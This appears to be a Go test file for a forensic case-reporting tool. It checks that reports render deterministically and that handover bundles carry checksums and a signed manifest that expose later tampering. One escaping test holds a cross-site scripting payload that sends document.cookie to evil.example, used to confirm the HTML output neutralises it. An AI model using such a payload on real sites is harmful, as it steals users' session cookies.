package builtin

import (
	"bufio"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"mutant/object"
)

// F-1's rule, applied to a handover: the bundle asserts that these documents
// belong to this case, so something has to fail when they do not. These tests
// are mostly that -- take the digests the bundle recorded, take the digests the
// files actually have, and insist the two cannot be made to disagree quietly.

func caseReportOf(t *testing.T, opts map[string]object.Object) *object.Hash {
	t.Helper()

	var args []object.Object
	if opts != nil {
		args = append(args, optsObj(opts))
	}
	value, errObj := unwrapPair(t, CaseReport(args...))
	if errObj != nil {
		t.Fatalf("case_report failed: %s", errObj.Message)
	}
	return value.(*object.Hash)
}

func bundleInto(t *testing.T, dir string, opts map[string]object.Object) *object.Hash {
	t.Helper()

	args := []object.Object{stringObj(dir)}
	if opts != nil {
		args = append(args, optsObj(opts))
	}
	value, errObj := unwrapPair(t, CaseBundle(args...))
	if errObj != nil {
		t.Fatalf("case_bundle failed: %s", errObj.Message)
	}
	return value.(*object.Hash)
}

// readChecksums parses SHA256SUMS the way sha256sum -c does.
func readChecksums(t *testing.T, path string) map[string]string {
	t.Helper()

	file, err := os.Open(path)
	if err != nil {
		t.Fatalf("reading %s: %v", path, err)
	}
	defer func() { _ = file.Close() }()

	sums := map[string]string{}
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, "  ", 2)
		if len(parts) != 2 {
			t.Fatalf("SHA256SUMS line is not in sha256sum format: %q", line)
		}
		sums[parts[1]] = parts[0]
	}
	if err := scanner.Err(); err != nil {
		t.Fatal(err)
	}
	return sums
}

func readBundleManifest(t *testing.T, dir string) map[string]any {
	t.Helper()

	raw, err := os.ReadFile(filepath.Join(dir, bundleManifestName))
	if err != nil {
		t.Fatalf("reading the bundled manifest: %v", err)
	}
	var document map[string]any
	if err := json.Unmarshal(raw, &document); err != nil {
		t.Fatalf("the bundled manifest is not JSON: %v", err)
	}
	return document
}

// caseWithEvidence opens a case that has something in it, so the report has
// rows rather than only a header.
func caseWithEvidence(t *testing.T) string {
	t.Helper()

	path, _ := writeTestImage(t, "carved.bin", 2048)
	openTestCase(t, "IR-2026-14", "A. Examiner", makeHashObject(map[string]object.Object{
		"hash": stringObj("sha256"),
	}))
	if _, errObj := unwrapPair(t, CaseEvidence(stringObj(path))); errObj != nil {
		t.Fatalf("case_evidence failed: %s", errObj.Message)
	}
	return path
}

func TestCaseReportSaysOnlyWhatTheManifestSays(t *testing.T) {
	useTestKeyStore(t)
	evidence := caseWithEvidence(t)

	manifest := currentManifest(t)
	entries := evidenceEntries(t, manifest)
	digest := mustHashStringValue(t, entries[0], "hash")

	report := caseReportOf(t, nil)
	if got := mustHashStringValue(t, report, "case_id"); got != "IR-2026-14" {
		t.Fatalf("case_id = %q", got)
	}
	if got := mustHashStringValue(t, report, "examiner"); got != "A. Examiner" {
		t.Fatalf("examiner = %q", got)
	}

	// Checked against the HTML rather than the Markdown, because Markdown escapes
	// for structure: a Windows path is full of backslashes, and every one of them
	// is escaped on the way into a table cell so it cannot start something. The
	// path is still the path -- it is just not the same string any more.
	html := renderTestReport(t, report, "html", nil)
	for _, want := range []string{evidence, digest, "IR-2026-14", "A. Examiner", "Evidence", "Timeline"} {
		if !strings.Contains(html, want) {
			t.Fatalf("the report does not carry %q:\n%s", want, html)
		}
	}
}

func TestCaseReportRefusesWithoutACase(t *testing.T) {
	resetCustodyForTesting()

	_, errObj := unwrapPairNoFatal(CaseReport())
	if errObj == nil {
		t.Fatal("case_report rendered a case that was never opened")
	}
	if !strings.Contains(errObj.Message, "case_open") {
		t.Fatalf("the refusal does not say what to do: %s", errObj.Message)
	}
}

// The same rule report_new follows: pin `generated` and two renders of one
// investigation are the same bytes, which is what makes a report diffable
// against the one written yesterday.
func TestCaseReportIsTheSameBytesTwice(t *testing.T) {
	caseWithEvidence(t)
	opts := map[string]object.Object{"generated": stringObj("2026-09-14T09:00:00Z")}

	first := renderTestReport(t, caseReportOf(t, opts), "html", nil)
	second := renderTestReport(t, caseReportOf(t, opts), "html", nil)
	if first != second {
		t.Fatal("two renders of one case are not the same bytes")
	}
}

// A report is built from the manifest, and the manifest carries text the subject
// of the investigation wrote. Phase 1 escapes it; this is the test that the case
// path actually goes through that renderer rather than around it.
func TestCaseReportEscapesWhatTheSubjectWrote(t *testing.T) {
	openTestCase(t, "IR-9", "examiner")
	hostile := `<script>fetch("https://evil.example/"+document.cookie)</script>`
	if _, errObj := unwrapPair(t, CaseNote(stringObj(hostile))); errObj != nil {
		t.Fatalf("case_note failed: %s", errObj.Message)
	}

	html := renderTestReport(t, caseReportOf(t, nil), "html", nil)
	if strings.Contains(html, "<script>") {
		t.Fatal("a note went into the HTML as markup")
	}
	if !strings.Contains(html, "&lt;script&gt;") {
		t.Fatal("the note is not in the report at all; it should be there, escaped")
	}
}

// The tables in a case report carry no caption, because each one sits under a
// heading that already names it. report_render labels an uncaptioned table by
// its section heading, so a CSV of a case report can still be asked for by name
// in the refusal and taken by index -- which is the only reason dropping the
// captions is safe.
func TestCaseReportTablesAreStillNameableForCsv(t *testing.T) {
	caseWithEvidence(t)
	report := caseReportOf(t, nil)

	_, errObj := unwrapPairNoFatal(ReportRender(report, stringObj("csv")))
	if errObj == nil {
		t.Fatal("a report with several tables rendered as one CSV")
	}
	for _, want := range []string{"0: Evidence", "Timeline"} {
		if !strings.Contains(errObj.Message, want) {
			t.Fatalf("the refusal does not name the tables (%q missing): %s", want, errObj.Message)
		}
	}

	text := renderTestReport(t, report, "csv", map[string]object.Object{
		"table": &object.Integer{Value: 0},
	})
	if !strings.HasPrefix(text, "source,size,modified,digest") {
		t.Fatalf("table 0 is not the evidence table: %.60q", text)
	}
}

func TestCaseBundleWritesTheHandover(t *testing.T) {
	useTestKeyStore(t)
	caseWithEvidence(t)

	dir := filepath.Join(t.TempDir(), "handover")
	result := bundleInto(t, dir, nil)

	for _, name := range []string{bundleManifestName, bundleHTMLName, bundleMarkdownName, bundleChecksumsName} {
		if _, err := os.Stat(filepath.Join(dir, name)); err != nil {
			t.Fatalf("the bundle has no %s: %v", name, err)
		}
	}
	if !mustBool(t, result, "signed") {
		t.Fatal("the manifest was not signed")
	}
	if got := mustHashStringValue(t, result, "status"); got != "ok" {
		t.Fatalf("status = %q", got)
	}

	files := mustHashValue(t, result, "files").(*object.Array)
	if len(files.Elements) != 4 {
		t.Fatalf("the result lists %d files, want 4", len(files.Elements))
	}
	for _, element := range files.Elements {
		entry := element.(*object.Hash)
		name := mustHashStringValue(t, entry, "name")
		digest, size := fileDigest(t, filepath.Join(dir, name))
		if got := mustHashStringValue(t, entry, "sha256"); got != digest {
			t.Fatalf("%s: the result says %q, the file hashes to %q", name, got, digest)
		}
		if got := mustHashValue(t, entry, "bytes").(*object.Integer).Value; got != size {
			t.Fatalf("%s: the result says %d bytes, the file is %d", name, got, size)
		}
	}
}

// SHA256SUMS has to be checkable by the tool an examiner already has, which
// means the format matters as much as the numbers.
func TestCaseBundleChecksumsAreWhatSha256sumWouldCheck(t *testing.T) {
	useTestKeyStore(t)
	caseWithEvidence(t)

	dir := t.TempDir()
	bundleInto(t, dir, nil)

	sums := readChecksums(t, filepath.Join(dir, bundleChecksumsName))
	for _, name := range []string{bundleManifestName, bundleHTMLName, bundleMarkdownName} {
		recorded, ok := sums[name]
		if !ok {
			t.Fatalf("SHA256SUMS does not cover %s", name)
		}
		digest, _ := fileDigest(t, filepath.Join(dir, name))
		if recorded != digest {
			t.Fatalf("%s: SHA256SUMS says %q, the file hashes to %q", name, recorded, digest)
		}
	}
	if _, ok := sums[bundleChecksumsName]; ok {
		t.Fatal("SHA256SUMS lists its own digest, which it cannot know")
	}
}

// The provenance claim, and the check behind it. The manifest records what each
// report hashed to; the manifest's own seal covers those digests; so a report
// altered after the handover no longer matches a document whose integrity anyone
// can verify without the machine that produced it.
func TestCaseBundleManifestVouchesForTheReports(t *testing.T) {
	useTestKeyStore(t)
	caseWithEvidence(t)

	dir := t.TempDir()
	bundleInto(t, dir, nil)

	document := readBundleManifest(t, dir)
	bundle, ok := document["bundle"].(map[string]any)
	if !ok {
		t.Fatal("the bundled manifest does not record what was written beside it")
	}
	wrote, ok := bundle["wrote"].([]any)
	if !ok || len(wrote) != 2 {
		t.Fatalf("the manifest records %v, want the two reports", bundle["wrote"])
	}

	recorded := map[string]string{}
	for _, element := range wrote {
		entry := element.(map[string]any)
		recorded[entry["name"].(string)] = entry["sha256"].(string)
	}
	for _, name := range []string{bundleHTMLName, bundleMarkdownName} {
		digest, _ := fileDigest(t, filepath.Join(dir, name))
		if recorded[name] != digest {
			t.Fatalf("%s: the manifest records %q, the file hashes to %q", name, recorded[name], digest)
		}
	}

	// The manifest verifies on its own terms first...
	before := verifyManifest(t, filepath.Join(dir, bundleManifestName))
	if !mustBool(t, before, "hash_matches") || !mustBool(t, before, "signature_valid") {
		t.Fatal("the bundled manifest does not verify against itself")
	}

	// ...and now the report is altered. The manifest still verifies -- nobody
	// touched it -- and that is exactly what makes the alteration visible: a
	// document whose integrity holds says the report should hash to something
	// it no longer hashes to.
	htmlPath := filepath.Join(dir, bundleHTMLName)
	body, err := os.ReadFile(htmlPath)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(htmlPath, append(body, ' '), 0o600); err != nil {
		t.Fatal(err)
	}

	after := verifyManifest(t, filepath.Join(dir, bundleManifestName))
	if !mustBool(t, after, "hash_matches") || !mustBool(t, after, "signature_valid") {
		t.Fatal("altering a report broke the manifest, which means the two are not independent")
	}
	altered, _ := fileDigest(t, htmlPath)
	if recorded[bundleHTMLName] == altered {
		t.Fatal("a byte was added to the report and its digest did not move")
	}
}

// sign:false is for a machine with no key store. The document then says it is
// unsigned rather than looking signed.
func TestCaseBundleCanBeWrittenUnsigned(t *testing.T) {
	useTestKeyStore(t)
	caseWithEvidence(t)

	dir := t.TempDir()
	result := bundleInto(t, dir, map[string]object.Object{"sign": &object.Boolean{Value: false}})
	if mustBool(t, result, "signed") {
		t.Fatal("sign:false produced a signed manifest")
	}

	verified := verifyManifest(t, filepath.Join(dir, bundleManifestName))
	if !mustBool(t, verified, "hash_matches") {
		t.Fatal("an unsigned manifest does not hash to its own seal")
	}
	if mustBool(t, verified, "signed") {
		t.Fatal("the unsigned manifest reads as signed")
	}
}

func TestCaseBundleRefusesWithoutACase(t *testing.T) {
	resetCustodyForTesting()

	_, errObj := unwrapPairNoFatal(CaseBundle(stringObj(t.TempDir())))
	if errObj == nil {
		t.Fatal("case_bundle wrote a handover for a case that was never opened")
	}
	if !strings.Contains(errObj.Message, "case_open") {
		t.Fatalf("the refusal does not say what to do: %s", errObj.Message)
	}
}

func TestCaseBundleRecordsItselfInTheCase(t *testing.T) {
	useTestKeyStore(t)
	caseWithEvidence(t)

	dir := t.TempDir()
	result := bundleInto(t, dir, nil)

	found := false
	for _, element := range manifestArray(t, currentManifest(t), "timeline") {
		entry, ok := element.(*object.Hash)
		if !ok {
			continue
		}
		if mustHashStringValue(t, entry, "event") != "case_bundle" {
			continue
		}
		found = true
		data := mustHashValue(t, entry, "data").(*object.Hash)
		if got := mustHashStringValue(t, data, "manifest_hash"); got != mustHashStringValue(t, result, "manifest_hash") {
			t.Fatal("the case and the caller were told different manifest hashes")
		}
	}
	if !found {
		t.Fatal("a handover was written and the case does not record it")
	}
}

// The bundle is a snapshot. Writing a second one after more work has to produce
// a manifest that covers the new reports, not the old ones.
func TestCaseBundleWrittenTwiceCoversWhatItJustWrote(t *testing.T) {
	useTestKeyStore(t)
	caseWithEvidence(t)

	first := t.TempDir()
	bundleInto(t, first, nil)

	if _, errObj := unwrapPair(t, CaseNote(stringObj("a second look at the temp directory"))); errObj != nil {
		t.Fatalf("case_note failed: %s", errObj.Message)
	}

	second := t.TempDir()
	bundleInto(t, second, nil)

	document := readBundleManifest(t, second)
	bundle := document["bundle"].(map[string]any)
	for _, element := range bundle["wrote"].([]any) {
		entry := element.(map[string]any)
		name := entry["name"].(string)
		digest, _ := fileDigest(t, filepath.Join(second, name))
		if entry["sha256"].(string) != digest {
			t.Fatalf("%s: the second manifest records a digest that is not the second report's", name)
		}
	}
}
